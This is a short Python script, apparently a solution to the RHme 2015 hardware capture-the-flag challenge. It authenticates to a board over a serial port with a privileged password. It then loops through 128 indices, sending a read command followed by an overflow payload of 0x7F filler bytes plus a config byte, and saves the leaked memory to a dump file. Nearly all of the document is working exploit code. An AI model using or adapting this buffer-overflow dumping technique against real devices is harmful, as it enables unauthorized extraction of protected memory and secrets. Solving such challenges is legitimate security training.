#!/usr/bin/env python

from rhme_utilities import *

#---------------------------------------
#   Implementation
#---------------------------------------

# Change this to configure the script
fillChar = '\x7F'
firstPart = '\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F'
configPart = '\x00'
customCommand = firstPart + configPart

# Info and Style
print("")
print("-------------------- RHme 2015 Dumper --------------------")
print("")

# Define Main
def main():
	# Flush serial
	Serial_Flush()
	
	# Reach desired state
	# Authenticate
	sendCommand = "A" + crlf
	serialPort.write(sendCommand.encode())
	temp = serialPort.readline()
	print(temp.decode())
	temp = serialPort.readline()
	temp = serialPort.readline()
	print(temp.decode())

	sendCommand = privPassword + crlf
	serialPort.write(sendCommand.encode())
	# Flush Serial
	for f in range(0, 2):
		temp = serialPort.readline()
		print(temp.decode())

	# Open file
	dump = open(r"dumps/test_full_dump_priv", "wb")

	for loop in range(0x00, 0x80):
		# Request reading
		sendCommand = "R" + crlf
		serialPort.write(sendCommand.encode())
		temp = serialPort.readline()

		# Perform overflow
		sendCommand = customCommand + chr(loop) + crlf
		print("Dumping loop: " + f'{loop}')
		serialPort.write(sendCommand.encode())
		# Flush Serial
		for f in range(0, 4):
			temp = serialPort.readline()

		# Dump everything
		temp = serialPort.read()
		while temp != b'':
			dump.write(temp)
			temp = serialPort.read()
		print("--- Memory Dumped ---")

	# Close File
	dump.close()

	print("Job's done!")

# Run Main
if __name__ == '__main__':
    main()
